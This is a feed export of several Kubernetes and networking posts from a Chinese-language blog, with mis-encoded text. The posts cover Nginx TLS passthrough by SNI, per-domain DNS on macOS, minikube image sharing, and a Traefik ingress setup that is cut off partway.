ä¹Ÿæœ‰ï¼Œæˆ‘ä¸¦ä¸æƒ³è¦æœ‰é€™éº¼å¤šçš„æ†‘è­‰æœƒé€ æˆé€£ç·šçš„æ•ˆèƒ½è€—æï¼Œæ–¼æ˜¯æŸ¥åˆ°å¯ä»¥ä½¿ç”¨ tls passthrough çš„æ–¹å¼ä¾†è®“ Nginx ä¸è™•ç†å°åŒ…çš„åŠ å¯†è§£å¯†ï¼Œç›´æ¥å°‡è©²å°åŒ… reverse proxy åˆ°å¾Œç«¯ã€‚</p><p>ä½†æ˜¯è©²æ–¹å¼æœƒç”¢ç”Ÿä¸€å€‹å•é¡Œï¼ŒNginx å¦‚æœä¸åšè§£å¯†ï¼Œé‚£éº¼ä¹Ÿçœ‹ä¸åˆ°å°åŒ… L7 çš„ Host æ¬„ä½ï¼Œæ–¼æ˜¯åŸæœ¬çš„ virtual host æ–¹å¼å°±ç„¡æ³•æ­£å¸¸è·¯ç”±ï¼Œè§£æ±ºæ–¹å¼ç‚ºä½¿ç”¨ TLS çš„ SNI ä¾†åˆ¤æ–·è·¯ç”±ã€‚</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">stream {</span><br><span class="line">    map $ssl_preread_server_name $name {</span><br><span class="line">        # åœ¨æ­¤è¨­å®šä¸åŒ SNI å°æ‡‰åˆ°ä¸åŒå¾Œç«¯;</span><br><span class="line">        argocd.tcs-proxy.cscc K8S_WORKER_443;</span><br><span class="line">        default https_default_backend;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    upstream K8S_WORKER_443 {</span><br><span class="line">        server worker-node-1:443;</span><br><span class="line">        server worker-node-2:443;</span><br><span class="line">        server worker-node-3:443;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    server {</span><br><span class="line">        listen 443;</span><br><span class="line">        proxy_pass $name; # å¦‚æœæ²’æœ‰è·¯ç”±éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¨­å®š proxy_pass K8S_WORKER_443;</span><br><span class="line">        ssl_preread on; # è©²é¸é …éœ€è¦æ‰“é–‹ï¼Œæ‰æœ‰è¾¦æ³•è®€å– SNI</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>è¦æ³¨æ„çš„æ˜¯ï¼Œé€šå¸¸ Nginx çš„è¨­å®šéƒ½æœƒåœ¨ http directiveï¼Œä½†æ˜¯ tls passthrough å¿…é ˆè¦è¨­å®šåœ¨ stream directive ä¸‹ï¼Œæ„å‘³è‘—åŸæœ¬çš„ log formatter ä¹Ÿç„¡æ³•ä½¿ç”¨äº†ï¼ˆå¯ä»¥å» nginx.conf çœ‹ä¸€ä¸‹ï¼‰ã€‚</p><p>æ‰€ä»¥æˆ‘å€‘å¿…é ˆå¢åŠ æ–°çš„ log formatter åœ¨ steam directive ä¸‹æ–¹</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stream {</span><br><span class="line">    log_format proxy '$remote_addr - [$time_local] '</span><br><span class="line">                    '$protocol $status $bytes_sent $bytes_received '</span><br><span class="line">                    '$session_time "$upstream_addr" '</span><br><span class="line">                    '"$upstream_bytes_sent" "$upstream_bytes_received" "$upstream_connect_time" '</span><br><span class="line">                    '$remote_addr $remote_port $server_addr $server_port';</span><br><span class="line">    server {</span><br><span class="line">        access_log      /var/log/tcp-stream-access.log proxy;</span><br><span class="line">        #...</span><br><span class="line">        #...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>å¦‚æ­¤ä¸€ä¾†æœƒç™¼ç¾å¤–å±¤çš„ Nginx æ²’æœ‰ä¸Šæ†‘è­‰ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨å¢é›†å…§éƒ¨æ†‘è­‰ä¾†å°é€£ç·šé€²è¡ŒåŠ å¯†ï¼</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
      <category term="traefik" scheme="https://blog.yiyu0x.org/tags/traefik/"/>
    
      <category term="nginx" scheme="https://blog.yiyu0x.org/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>macOS-ä¸­-VPN-è§£æåŸŸåéŒ¯èª¤</title>
    <link href="https://blog.yiyu0x.org/2021/01/06/"/>
    <id>https://blog.yiyu0x.org/2021/01/06/</id>
    <published>2021-01-06T11:01:45.000Z</published>
    <updated>2025-04-12T20:59:43.589Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>macOS ä¸­çš„ DNS é †åºä¸¦æ²’æœ‰æ„ç¾©ï¼ˆå„˜ç®¡ç³»çµ±é‚„è®“ä½ ç§»å‹•é †åºï¼‰ï¼Œæ±ºå®š DNS Server ä½¿ç”¨éš¨æ©Ÿæ–¹å¼ä¾†é¸æ“‡ã€‚å¦‚æœæƒ³è¦æŒ‡å®šç‰¹å®šç¶²åŸŸä½¿ç”¨ç‰¹å®šçš„ DNS Serverï¼Œè«‹ä½¿ç”¨ <code>scutil</code> æŒ‡ä»¤è¨­å®šã€‚</p><p><code>/etc/resolv.conf</code> çš„ nameserver é †åºä¹Ÿç›¸åŒæ²’æœ‰æ„ç¾©ï¼Œç³»çµ±æ¡éš¨æ©Ÿæ–¹å¼é¸æ“‡ nameserverã€‚</p><h1 id="ç’°å¢ƒ"><a href="#ç’°å¢ƒ" class="headerlink" title="ç’°å¢ƒ"></a>ç’°å¢ƒ</h1><p>é€£ä¸Šå¯¦é©—å®¤çš„ VPN å¾Œï¼Œç™¼ç¾ VPN ä¸­çš„ domain éƒ½è§£æå¤±æ•—ï¼Œä½†æ˜¯ dig å»æ˜¯æ­£å¸¸çš„ã€‚çœ‹äº†ä¸€ä¸‹ DNS è¨­å®šä¹Ÿéƒ½æ­£å¸¸ï¼Œæ–¼æ˜¯é–‹å§‹æ‰¾åŸå› â€¦â€¦</p><h1 id="DNS-è§£æå•é¡Œ"><a href="#DNS-è§£æå•é¡Œ" class="headerlink" title="DNS è§£æå•é¡Œ"></a>DNS è§£æå•é¡Œ</h1><p>å‡è¨­ä»Šå¤©æˆ‘è¦è§£æ website.mydomain.orgï¼ˆå…§ç¶²ï¼‰ï¼Œæˆ‘çš„ <code>/etc/resolve.conf</code> å¦‚ä¸‹</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search mydomain.org</span><br><span class="line">nameserver 10.0.0.1 # å…§ç¶² DNS 1</span><br><span class="line">nameserver 10.0.0.2 # å…§ç¶² DNS 2</span><br><span class="line">nameserver 1.1.1.1</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></tbody></table></figure><p>æ­¤æ™‚æœ‰æ©Ÿç‡è¼ªåˆ°å¾Œé¢å…©çµ„ï¼Œé€ æˆè§£æå¤±æ•—ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦é¡å¤–è¨­å®š</p><h1 id="è§£æ±º"><a href="#è§£æ±º" class="headerlink" title="è§£æ±º"></a>è§£æ±º</h1><p>åˆ—å‡ºæœ¬æ©Ÿä¸Š dns è¨­å®š</p><p><code>scutil --dns</code></p><p>æˆ‘å€‘éœ€è¦é‡å°ç‰¹å®šçš„ç¶²åŸŸä½¿ç”¨ç‰¹å®šçš„ DNS Server ä¾†è§£æ</p><p>é¦–å…ˆå»ºç«‹ç›®éŒ„ï¼Œä½ç½®å¿…é ˆæ˜¯ <code>/etc/resolver</code></p><p><code>sudo mkdir /etc/resolver</code></p><p>è£¡é¢çš„æª”åä¾ç…§ domain å»è¨­å®šï¼Œå‡è¨­æˆ‘è¦æŒ‡å®š mydomain.org ä¸‹çš„ nameserverï¼Œæˆ‘çš„æª”åå°±æ˜¯ <code>mydomain.org</code></p><p>æ¥è€…æŠŠè©² domain ç”¨åˆ°çš„ nameserver å¯«ä¸Šï¼Œæ ¼å¼èˆ‡ <code>/etc/resolv.conf</code> ä¸€æ¨£</p><p><code>echo 'nameserver 10.0.0.1' > /etc/resolver/mydomain.org</code><br><code>echo 'nameserver 10.0.0.2' > /etc/resolver/mydomain.org</code></p><p>è¨­å®šä¹‹å¾Œå†åº¦è¨ªå• <code>website.mydomain.org</code> å°±å¯ä»¥æ­£å¸¸è§£æäº†</p><h3 id="åƒè€ƒ"><a href="#åƒè€ƒ" class="headerlink" title="åƒè€ƒ"></a>åƒè€ƒ</h3><ul><li><a href="https://medium.com/@jamieeduncan/i-recently-moved-to-a-macbook-for-my-primary-work-laptop-7c704dbaff59" target="_blank" rel="noopener">Domain-specific DNS server on your Macbook Pro</a></li></ul></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="macOS" scheme="https://blog.yiyu0x.org/tags/macOS/"/>
    
      <category term="DNS" scheme="https://blog.yiyu0x.org/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>èˆ‡ minikube å…±äº« local docker image</title>
    <link href="https://blog.yiyu0x.org/2020/08/31/"/>
    <id>https://blog.yiyu0x.org/2020/08/31/</id>
    <published>2020-08-31T12:27:41.000Z</published>
    <updated>2025-04-12T20:59:43.596Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>ç‚ºäº†å°‡æœå‹™è·‘åœ¨ K8s ä¸­ï¼Œå®¹å™¨åŒ–æ˜¯å¿…é ˆçš„ã€‚åœ¨ç¨‹å¼å³å°‡éƒ¨ç½²ä¹‹éš›ï¼Œæœƒéœ€è¦æ¸¬è©¦ä¸€äº› K8s ä¸­çš„ç’°å¢ƒè®Šæ•¸æ˜¯å¦å¯ä»¥è¢«ç¨‹å¼æ­£å¸¸è®€å–ï¼Œæˆ–æ˜¯ç‚ºäº†ç¬¦åˆ K8s ç’°å¢ƒï¼Œå°‡ç¨‹å¼æ‰“åŒ…æˆå®¹å™¨æ˜ åƒè©¦è‘—éƒ¨ç½²ä¸Šå¢é›†è©¦è©¦çœ‹æœ‰æ²’æœ‰å•é¡Œã€‚é€™å€‹éç¨‹çš„å·¥ä½œæµå¤§è‡´ä¸Šå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ‰“åŒ… (docker build . -t my-app:0.1)</span><br><span class="line">éƒ¨ç½² (kubectl apply -f deploy.yaml)</span><br><span class="line">ç¢ºèªæ˜¯å¦æœ‰å•é¡Œï¼Œæœ‰çš„è©±ä¿®æ”¹ç¨‹å¼ï¼Œç„¶å¾Œç¹å›ç¬¬ä¸€æ­¥</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘å€‘åœ¨ Local é–‹ç™¼æ™‚ï¼Œå¯èƒ½æœƒä½¿ç”¨ minikube ä¾†ç•¶ä½œæ¸¬è©¦ç”¨çš„éƒ¨ç½²ç’°å¢ƒï¼Œä½†æ˜¯ minikube å¯¦éš›ä¸Šæ˜¯èµ·ä¸€å€‹æ–°çš„ docker-daemonï¼Œä»–ä¸¦ä¸èªè­˜ macOS æˆ–æ˜¯ Linux ä¸Šçš„ docker-daemonã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä½ åœ¨ Local å°‡ image build å®Œç•¢ï¼Œåœ¨ minikube ä¸­ä¸¦ç„¡æ³•å­˜å– Local çš„ Docker Registryã€‚é€™å°æ–¼æ­£åœ¨å¿«é€Ÿé–‹ç™¼æ¸¬è©¦çš„äººä¾†èªªæ¥µç‚ºä¸ä¾¿ï¼Œæˆ‘å€‘å¾ˆå¯èƒ½æ”¹ä¸€è¡Œ code å°±éœ€è¦é¦¬ä¸Šçœ‹æ˜¯å¦åœ¨ K8s ç’°å¢ƒèƒ½æ­£å¸¸é‹ä½œã€‚</p><p>è¦è§£æ±ºé€™å€‹å•é¡Œå¤§è‡´ä¸Šæœ‰å¹¾ç¨®æ–¹æ³•ï¼š</p><ol><li>ä½¿ç”¨å¤–éƒ¨ Docker Hub ä¾†ç•¶ä½œ Docker Registry<br> ç¼ºé»ï¼šæš´éœ²åœ¨å¤–ç¶²ã€å¤–ç¶²æµé‡æ…¢</li><li>åœ¨ Local è·‘ä¸€å€‹ Docker Registryï¼Œè®“ Local èˆ‡ minikube å…±ç”¨<br> ç¼ºé»ï¼šLocal IP å¦‚æœæ›æ‰ï¼Œyaml è¨­å®šæª”çš„ image ä½ç½®åˆè¦é‡å¯«</li><li>åœ¨ minikube ç’°å¢ƒä¸­è·‘ä¸€å€‹ Docker Registryï¼Œport-forward åˆ° Local ä¸Š<br> ç¼ºé»ï¼šç¬¬ä¸€æ¬¡è¨­å®šè¼ƒç¹ç‘£ï¼Œä½†å¤§è‡´ä¸Šå·²ç¶“ç®—å¥½ç”¨</li></ol><p>é€™é‚Šè¦æçš„æ–¹æ³•å€‹äººè¦ºå¾—è¼ƒæ–¹ä¾¿ï¼Œä½†åŒæ™‚ä¹Ÿæœ‰ä¸€äº›ä¸æ–¹ä¾¿çš„åœ°æ–¹</p><p>è©²æ–¹æ³•åŸç†æ˜¯ç›´æ¥åœ¨ build image æ™‚ç›´æ¥å­˜é€² minikube çš„ Registry ä¸­</p><p>æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><code>eval $(minikube docker-env)</code></p><p><code>docker build -t my-app .</code></p><p>æ­¤æ™‚å¯ä»¥ç”¨ <code>minikube ssh</code> é€²å»çœ‹ <code>docker images</code> æœƒç™¼ç¾ Image å·²ç¶“é€²åˆ° Registry ä¸­</p><p>æœ€å¾Œåœ¨ yaml æª”æœ‰ç”¨åˆ°è©² image çš„åœ°æ–¹åŠ ä¸Š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imagePullPolicy:</span> <span class="string">Never</span></span><br></pre></td></tr></tbody></table></figure><p>ç¢ºä¿åœ¨ pull image æ™‚åªæœƒæ‹‰ Local çš„ Image</p><p>è©²æ–¹æ³•æ˜¯é€éé‡æ–°æŒ‡å®šç’°å¢ƒè®Šæ•¸ä¾†æ”¹è®Š docker æŒ‡ä»¤æ“ä½œ docker-deamon çš„ä½ç½®</p><p>æ‰€ä»¥é–‹ä¸€å€‹æ–°çš„ session å°±è¦é‡æ–°è¨­å®šä¸€æ¬¡ï¼Œç®—æ˜¯ä¸€å€‹å°ç¼ºé»</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
      <category term="docker" scheme="https://blog.yiyu0x.org/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ K8S ä¸­ä½¿ç”¨ Traefik ä½œç‚º Ingress Controllers</title>
    <link href="https://blog.yiyu0x.org/2020/07/11/"/>
    <id>https://blog.yiyu0x.org/2020/07/11/</id>
    <published>2020-07-11T07:53:37.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>K8S ä¸­çš„ Ingress Controllers ä¸¦æ²’æœ‰å¯¦ä½œï¼Œå¯ä»¥è‡ªå·±ä½¿ç”¨å„ç¨®ç‰ˆæœ¬ã€‚åœ¨ Minikube ä¸­çš„ Ingress Controllers é è¨­æ˜¯ç”¨ <a href="https://kubernetes.github.io/ingress-nginx/" target="_blank" rel="noopener">NGINX Ingress Controller</a>ï¼Œç„¶è€Œ NGINX Ingress Controller çš„åŠŸèƒ½éå¸¸é™½æ˜¥ï¼Œå®˜ç¶²æœ‰æä¾›ä¸€ç³»åˆ—çš„ <a href="https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/" target="_blank" rel="noopener">Ingress Controller</a> çµ¦å„ä½åƒè€ƒï¼Œè©²æ–‡ç« ç´€éŒ„å¦‚ä½•ä½¿ç”¨ <a href="https://docs.traefik.io/" target="_blank" rel="noopener">Traefik</a> é€™å€‹ Edge Router ä½œç‚º Ingress Controllerã€‚</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>åœ¨æ“ä½œ K8S ä¹‹å‰è«‹å…ˆç¢ºå®šä½ æ­£åœ¨æ“ä½œçš„å¢é›†æ˜¯ç·´ç¿’ç’°å¢ƒï¼š</p><p><code>kubectl cluster-info</code></p><p>Traefik é€™å¥—å·¥å…·å¯ä»¥å°‡å¤–éƒ¨çš„æµé‡å¸æ”¶ï¼Œä¸¦ä¸”é€éè‡ªå·±å®šç¾©çš„è·¯ç”±ä¾†å°‡æµé‡å¾€å…§éƒ¨çš„ Service æ‰“ã€‚æˆ‘å€‘å¸Œæœ›å¯ä»¥é€é URL çš„ Path ä¾†å®šç¾©ä¸åŒæœå‹™çš„è·¯ç”±ï¼Œå°‡æµé‡æ‰“å‘ä¸åŒçš„æœå‹™ã€‚</p><p>åœ¨ NGINX Ingress Controller ä¸­è¦åšé€™ä»¶äº‹æƒ…ï¼Œè¦åœ¨ <code>annotations</code> ä¸­åŠ ä¸Š <code>nginx.ingress.kubernetes.io/rewrite-target: /</code></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">rewrite</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></tbody></table></figure><p>é¿å…ä¸åŒ App åƒåˆ°ä¸åŒçš„è·¯ç”±ä½ç½®ç„¡æ³•ç”¢ç”Ÿæ­£ç¢ºçš„å›æ‡‰ï¼ˆå‡è¨­æˆ‘å€‘çš„æœå‹™å…¥å£éƒ½åœ¨æ ¹è·¯å¾‘ Ex: <code>app-foo/</code> ï¼‰ã€‚</p><p>ä½† Traefik è¦é”æˆé€™ä»¶äº‹æƒ…å¿…é ˆé€é <a href="https://docs.traefik.io/middlewares/overview/" target="_blank" rel="noopener">Middleware</a> é€™å€‹çµ„ä»¶ï¼ˆTraefik å®šç¾©çš„åŠŸèƒ½ï¼‰ï¼Œç°¡å–®ä¾†èªªæˆ‘å€‘è¦æŠŠè®€é€²ä¾†çš„ /pathï¼Œstrip æ‰ä¸¦ä¸”å°‡å°å‘åˆ°æŒ‡å®šçš„ Service ä¸Šã€‚</p><p><img src="https://docs.traefik.io/assets/img/middleware/overview.png" alt></p><p>è¦ä½¿ç”¨ Traefik Middleware æœ‰å…©ç¨®æ–¹å¼ï¼š</p><ul><li>IngressRoute (CustomResourceDefinitions)</li><li>åœ¨ Ingress ä¸­ä½¿ç”¨ annotation å®šç¾©</li></ul><p>å€‹äººè¦ºå¾—ç¬¬äºŒé»æ¯”è¼ƒç›´è¦ºï¼Œæ‰€ä»¥é¸æ“‡ç¬¬äºŒç¨®æ–¹å¼ã€‚</p><p>é¦–å…ˆï¼Œå…ˆå»ºç«‹ Middleware é€™å€‹ CRDï¼Œä¸¦ä¸”åš ClusterRoleBindingï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apiextensions.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CustomResourceDefinition</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">middlewares.traefik.containo.us</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  group:</span> <span class="string">traefik.containo.us</span></span><br><span class="line"><span class="attr">  version:</span> <span class="string">v1alpha1</span></span><br><span class="line"><span class="attr">  names:</span></span><br><span class="line"><span class="attr">    kind:</span> <span class="string">Middleware</span></span><br><span class="line"><span class="attr">    plural:</span> <span class="string">middlewares</span></span><br><span class="line"><span class="attr">    singular:</span> <span class="string">middleware</span></span><br><span class="line"><span class="attr">  scope:</span> <span class="string">Namespaced</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">""</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">services</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">endpoints</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">secrets</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">list</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">watch</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">extensions</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingresses</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">list</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">watch</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">extensions</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingresses/status</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">update</span></span><br><span class="line"><span class="attr">  - apiGroups:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">traefik.containo.us</span></span><br><span class="line"><span class="attr">    resources:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">middlewares</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingressroutes</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">traefikservices</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingressroutetcps</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">ingressrouteudps</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">tlsoptions</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">tlsstores</span></span><br><span class="line"><span class="attr">    verbs:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">list</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">watch</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line"><span class="attr">  apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">  kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="attr">  - kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"><span class="attr">    namespace:</span> <span class="string">default</span></span><br></pre></td></tr></tbody></table></figure><p>å°‡ Traefik æœ¬èº«è·‘èµ·ä¾†ï¼š</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik-ingress-controller</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">traefik</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  replicas:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    matchLabels:</span></span><br><span class="line"><span class="attr">      app:</span> <span class="string">traefik</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span 